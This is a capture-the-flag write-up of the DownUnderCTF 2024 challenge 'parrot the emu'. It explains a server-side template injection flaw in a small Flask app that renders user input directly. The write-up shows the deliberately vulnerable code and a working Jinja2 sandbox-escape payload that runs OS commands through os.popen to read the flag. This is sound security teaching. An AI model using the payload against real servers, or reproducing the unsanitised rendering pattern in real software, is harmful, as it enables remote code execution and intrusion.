# parrot the emu

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 993 solves / 100 points
- Author: @richighimi
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

It is so nice to hear Parrot the Emu talk back

Author: richighimi

[https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev](https://web-parrot-the-emu-4c2d0c693847.2024.ductf.dev)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708150725.png)

In here, we can talk to the Emu named "Parrot" by submitting something?

Let's try to submit a random text:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708150828.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708150842.png)

Hmm... It seems like we can chat with the Emu, and it'll repeat the same thing that we just submitted?

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708151045.png)

When we click the "Submit" button, it'll send a POST request to `/` with parameter `user_input`.

There's no much we can do in here. Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/web/parrot-the-emu/parrot-the-emu.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/parrot-the-emu)-[2024.07.08|15:11:40(HKT)]
└> file parrot-the-emu.zip 
parrot-the-emu.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2024/web/parrot-the-emu)-[2024.07.08|15:11:41(HKT)]
└> unzip parrot-the-emu.zip 
Archive:  parrot-the-emu.zip
   creating: parrot-the-emu/
   creating: parrot-the-emu/main-app/
   creating: parrot-the-emu/main-app/static/
   creating: parrot-the-emu/main-app/static/css/
  inflating: parrot-the-emu/main-app/static/css/styles.css  
   creating: parrot-the-emu/main-app/templates/
  inflating: parrot-the-emu/main-app/templates/index.html  
 extracting: parrot-the-emu/main-app/flag  
  inflating: parrot-the-emu/main-app/app.py  
 extracting: parrot-the-emu/main-app/requirements.txt  
```

After reviewing this application's source code, we have the following findings:

1. The main logic of this web application is `parrot-the-emu/main-app/app.py`, which uses the [**Flask**](https://flask.palletsprojects.com/en/3.0.x/) Python web application framework and [**Jinja2**](https://jinja.palletsprojects.com/en/3.1.x/) rendering template engine.
2. The flag file is at `parrot-the-emu/main-app/flag`. However, there's no routes (endpoints) to read the flag file's content.

Now, let's dive into the main logic, `parrot-the-emu/main-app/app.py`!

```python
from flask import Flask, render_template, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def vulnerable():
    chat_log = []

    if request.method == 'POST':
        user_input = request.form.get('user_input')
        try:
            result = render_template_string(user_input)
        except Exception as e:
            result = str(e)

        chat_log.append(('User', user_input))
        chat_log.append(('Emu', result))
    
    return render_template('index.html', chat_log=chat_log)

if __name__ == '__main__':
    app.run(debug=True, port=80)
```

In here, we can see that this web application only has 1 route at `/`.

When we send a GET request to `/`, it'll render the `index.html` template with a variable called `chat_log`.

When we send a **POST** request to `/`, our `user_input` parameter's value will be rendered by the Jinja template engine (Function `render_template_string`).

Let's take a look at the template at `parrot-the-emu/main-app/templates/index.html`!

```html
[...]
    <div class="container">
        <h1>Talk to our Emu named Parrot?</h1>
        <div class="chat-log">
            {% for speaker, message in chat_log %}
                <div class="message {% if speaker == 'User' %}user-message{% else %}emu-message{% endif %}">
                    <div class="speaker-label">{{ speaker }}</div>
                    <div class="message-text">{{ message }}</div>
                </div>
            {% endfor %}
        </div>
        <form method="POST">
            <label for="user_input">Enter something:</label>
            <input type="text" id="user_input" name="user_input">
            <button type="submit">Submit</button>
        </form>
    </div>
[...]
```

In Jinja template engine, it uses **`{{ }}` template literal** to render the dynamic content on the server-side. So in this `index.html` template, it uses Jinja's for loop syntax to loop over the `chat_log` set and render the set's values.

Hmm... Since there's **no sanitization** to sanitize our `user_input`, we can use the Jinja template engine's template literal to render whatever we want on the server-side!

This type of vulnerability is called **"Server-Side Template Injection", or SSTI**.

## Exploitation

To proof we can exploit this SSTI vulnerability on the web application, we can **send the following POST request to `/` with parameter `user_input` value `{{ 7*7 }}`**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708152816.png)

Nice! Our user input $7 * 7$ gets rendered by the Jinja template engine, which is $49$!

But... How can we read the flag file's content?

In SSTI vulnerability, usually we can achieve **Remote Code Execution (RCE)**.

To do so, we need to find a way to **escape from the sandbox** and recover access the regular Python execution flow by **abusing Python's objects** that are **from** the **non-sandboxed environment but are accessible from the sandbox**.

> Note: More details about Jinja2 SSTI RCE can be read in this HackTricks link: [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti).

**One of those RCE payloads is this:**
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
```

As you can see, it escapes the sandbox and imports module `os`, and execute `ls` OS command via the `popen` method.

Let's try it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708160606.png)

**Nice! It worked! Let's read the flag file's content by using OS command `cat flag`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2024/images/Pasted%20image%2020240708160649.png)

- **Flag: `DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}`**

## Conclusion

What we've learned:

1. Server-Side Template Injection (SSTI) in Jinja